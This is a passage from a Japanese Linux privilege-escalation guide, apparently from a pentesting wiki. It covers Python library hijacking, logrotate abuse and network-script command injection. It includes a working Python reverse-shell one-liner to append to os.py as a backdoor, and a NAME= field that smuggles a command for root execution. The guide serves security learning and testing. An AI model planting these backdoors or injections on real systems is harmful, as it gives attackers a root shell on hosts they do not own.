これらの手法の実施方法についてはここで詳細に説明しませんが、興味がある場合は、[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が実行する最後のチェックを確認できます。

## 書き込み可能なファイル

### Pythonライブラリの乗っ取り

Pythonスクリプトが実行される**場所**がわかっており、そのフォルダに**書き込み可能**であるか、または**Pythonライブラリを変更**できる場合、OSライブラリを変更してバックドアを仕掛けることができます（Pythonスクリプトが実行される場所に書き込み可能である場合、os.pyライブラリをコピーして貼り付けてください）。

ライブラリにバックドアを仕掛けるには、os.pyライブラリの最後に次の行を追加します（IPとPORTを変更してください）:
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotateの悪用

`logrotate`の脆弱性により、ログファイルまたはその親ディレクトリに**書き込み権限**を持つユーザーが特権を昇格する可能性があります。これは、`logrotate`が**root**として実行されることが多いため、特に_**/etc/bash\_completion.d/**_のようなディレクトリで任意のファイルを実行するように操作できるからです。_**/var/log**_だけでなく、ログのローテーションが適用されているすべてのディレクトリのアクセス権限を確認することが重要です。

{% hint style="info" %}
この脆弱性は`logrotate`バージョン`3.18.0`およびそれ以前に影響します
{% endhint %}

この脆弱性に関する詳細情報は、次のページで確認できます: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

この脆弱性は[**logrotten**](https://github.com/whotwagner/logrotten)を使用して悪用できます。

この脆弱性は[**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginxログ)** に非常に類似していますので、ログを変更できることがわかった場合は、ログをシンボリックリンクに置き換えて特権を昇格できるかどうかを確認してください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**脆弱性リファレンス:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

何らかの理由でユーザーが_**/etc/sysconfig/network-scripts**_に`ifcf-<whatever>`スクリプトを**書き込む**ことができるか、既存のスクリプトを**調整**できる場合、システムは**乗っ取られています**。

ネットワークスクリプト、例えば_ifcg-eth0_はネットワーク接続に使用されます。これらは.INIファイルとまったく同じように見えます。ただし、LinuxではこれらがNetwork Manager (dispatcher.d)によって\~ソース化\~されます。

私の場合、これらのネットワークスクリプトでの`NAME=`属性が正しく処理されていません。名前に**空白があると、システムは空白の後ろの部分を実行しようとします**。つまり、**最初の空白の後にあるすべてがrootとして実行されます**。

例: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init、init.d、systemd、およびrc.d**

ディレクトリ `/etc/init.d` には、**System V init (SysVinit)**、**クラシックなLinuxサービス管理システム**のスクリプトが格納されています。これには、サービスを `start`、`stop`、`restart`、そして時には `reload` するスクリプトが含まれています。これらは直接実行するか、`/etc/rc?.d/` で見つかるシンボリックリンクを介して実行できます。Redhatシステムの代替パスは `/etc/rc.d/init.d` です。

一方、`/etc/init` は**Upstart**に関連付けられており、Ubuntuによって導入された新しい**サービス管理**に使用され、サービス管理タスクのための構成ファイルを使用します。Upstartへの移行にもかかわらず、Upstartに互換性レイヤーがあるため、SysVinitスクリプトは引き続きUpstart構成と共に使用されています。

**systemd** は、オンデマンドデーモンの起動、自動マウント管理、およびシステム状態のスナップショットなどの高度な機能を提供する現代的な初期化およびサービスマネージャーとして登場します。配布パッケージのファイルは `/usr/lib/systemd/` に、管理者の変更は `/etc/systemd/system/` に整理され、システム管理プロセスを効率化します。
